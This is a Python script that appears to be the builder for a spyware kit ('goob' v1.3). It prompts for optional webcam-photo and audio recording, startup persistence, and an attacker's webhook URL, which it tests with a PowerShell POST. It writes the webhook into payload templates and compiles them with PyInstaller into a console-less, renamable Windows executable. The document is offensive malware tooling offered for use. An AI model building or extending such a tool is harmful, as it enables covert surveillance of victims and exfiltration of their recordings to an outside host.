import os
import shutil
import subprocess
from colorama import Fore, Style, init
import time
import sys

# Initialize colorama
init(autoreset=True)

def display_ascii_art():
    ascii_art = r"""
   
-----------------------------------------------      
 ________  ________  ________  ________   v1.3  
|\   ____\|\   __  \|\   __  \|\   __  \    
\ \  \___|\ \  \|\  \ \  \|\  \ \  \|\ /_   
 \ \  \  __\ \  \\\  \ \  \\\  \ \   __  \  
  \ \  \|\  \ \  \\\  \ \  \\\  \ \  \|\  \ 
   \ \_______\ \_______\ \_______\ \_______\
    \|_______|\|_______|\|_______|\|_______|
                                           
-----------------------------------------------                                       
    """
    print(Fore.LIGHTBLUE_EX + ascii_art)


def loading_animation(message, color_sequence=None, duration=5):
    if color_sequence is None:
        color_sequence = [Fore.LIGHTYELLOW_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTMAGENTA_EX]

    spinner = ['|', '/', '-', '\\']  # Spinner pattern
    end_time = time.time() + duration  # Duration for the animation

    print(color_sequence[0] + message, end=" ", flush=True)

    i = 0  # Spinner index
    while time.time() < end_time:
        # Cycle through the colors and spinner symbols
        color = color_sequence[i % len(color_sequence)]
        sys.stdout.write(color + spinner[i % len(spinner)])  # Print spinner
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write('\b')  # Erase spinner
        i += 1  # Move to next spinner symbol

    print()  # Just move to the next line, don't say "Done!"

def test_webhook(webhook):
    # Test the webhook immediately
    test_command = f"powershell -Command \"try {{Invoke-RestMethod -Uri '{webhook}' -Method POST -ContentType 'application/json' -Body '{{\\\"content\\\":\\\"goob says hi, say hi to goob\\\"}}'; exit 0}} catch {{exit 1}}\""
    result = subprocess.run(test_command, shell=True)  # Using subprocess.run()
    return result.returncode == 0  # Return True if the webhook is valid

def main():
    # Display ASCII art
    display_ascii_art()


    record_media = input(Fore.LIGHTYELLOW_EX + "Should the script include functionality to record audio and take a photo from the webcam?(y/n): ").strip().lower()

    
    add_to_startup = input(Fore.LIGHTYELLOW_EX + "Do you want to add the record script to startup? (y/n): ").strip().lower()

  
    if record_media == 'y' and add_to_startup == 'y':
        script_to_compile = "SCscript.py"  # Both options selected
    elif record_media == 'n' and add_to_startup == 'y':
        script_to_compile = "startup.py"  # Only add to startup selected
    elif record_media == 'y':
        script_to_compile = "record.py"  # Only record media selected
    else:
        script_to_compile = "script.py"  # Both options are 'n'


    webhook = input(Fore.LIGHTYELLOW_EX + "Enter the webhook URL: ")

    # Test the webhook immediately
    if not test_webhook(webhook):
        print(Fore.RED + "Webhook is not valid. Exiting without changes.")
        input("Press any key to exit...")
        return

    print(Fore.LIGHTGREEN_EX + "Webhook is valid. Proceeding with the build.")

 
    backup_script = f"SRC/{script_to_compile}_backup.py"
    shutil.copyfile(f"SRC/{script_to_compile}", backup_script)


    with open(f"SRC/{script_to_compile}", 'r') as file:
        script_content = file.read()
    script_content = script_content.replace('{{WEBHOOK}}', webhook)
    with open(f"SRC/{script_to_compile}", 'w') as file:
        file.write(script_content)

    while True:
        rename = input(Fore.LIGHTGREEN_EX + "Do you want to rename the output executable? (y/n): ").strip().lower()
        if rename == 'y':
            newname = input(Fore.LIGHTGREEN_EX + "Enter the new name for the executable (without extension): ").strip()
            output_file = f"dist/{newname}.exe"
            break
        elif rename == 'n':
            output_file = f"dist/{script_to_compile.replace('.py', '')}.exe"  # Default name based on the script
            break
        else:
            print(Fore.RED + 'Invalid input. Please type "y" for yes or "n" for no.')


    loading_animation("Building the executable", [Fore.MAGENTA, Fore.CYAN, Fore.LIGHTYELLOW_EX], duration=5)  # Cool loading animation


    build_command = f"pyinstaller --onefile --noconsole --distpath dist --workpath build --specpath build SRC/{script_to_compile} --name {'script' if rename == 'n' else newname}"
    subprocess.run(build_command, shell=True)  # Using subprocess.run()


    shutil.copyfile(backup_script, f"SRC/{script_to_compile}")
    os.remove(backup_script)

    print(Fore.LIGHTCYAN_EX + f"Build complete! The executable is in the 'dist' folder as '{output_file}'.")
    input("Press any key to exit...")

if __name__ == "__main__":
    main()
